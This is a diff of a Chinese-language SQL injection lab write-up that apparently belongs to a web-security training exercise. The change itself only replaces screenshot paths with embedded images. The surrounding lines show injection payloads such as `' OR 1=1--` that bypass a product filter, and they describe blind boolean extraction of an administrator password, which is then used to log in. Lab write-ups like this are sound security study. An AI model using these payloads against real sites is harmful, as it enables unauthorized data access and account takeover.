@@ -104,7 +104,10 @@ SELECT trackingId FROM tracking WHERE trackingId = '<我发来的 cookie>'
 - 加引号：`GET /filter?category=Corporate+gifts'` → **500 Internal Server Error**（语法被破坏）
 - 截断：`GET /filter?category=Corporate+gifts'--` → 恢复 **4** 件（`--` 注释掉网站补的结尾引号）
 - 恒真：`GET /filter?category=Corporate+gifts' OR 1=1--` → **20** 件（多出 16 件未发布商品）→ 条件恒真，绕过 `released = 1` 过滤
-- 截图：`screenshots/01-sqli-01-normal.png`（正常 + 地址栏）、`screenshots/01-sqli-02-injected.png`（恒真后的商品列表）
+- 截图：
+
+  ![正常请求：3 件商品 + 地址栏](screenshots/01-sqli-01-normal.png)
+  ![恒真条件：返回 20 件（含 16 件未发布商品）](screenshots/01-sqli-02-injected.png)
 
 ---
 
@@ -138,7 +141,11 @@ password = 7lt55xwcq0ma8ti0h7v5
 
 - 用户名：`administrator`（题目给定，也写死在提取子查询里）
 - 登录：`My account` → 用户名 `administrator` + 上面密码 → lab 顶部出现 `Congratulations`
-- 截图：`screenshots/01-sqli-03-bool.png`（真假对比）、`01-sqli-04-script.png`（终端输出）、`01-sqli-05-solved.png`（过关）
+- 截图：
+
+  ![真假条件对比：200/True/11544 与 200/False/11483](screenshots/01-sqli-03-bool.png)
+  ![脚本输出：逐字符提取 20 位密码](screenshots/01-sqli-04-script.png)
+  ![lab 过关：Congratulations](screenshots/01-sqli-05-solved.png)
 
 ### 3.3 效率对比
 
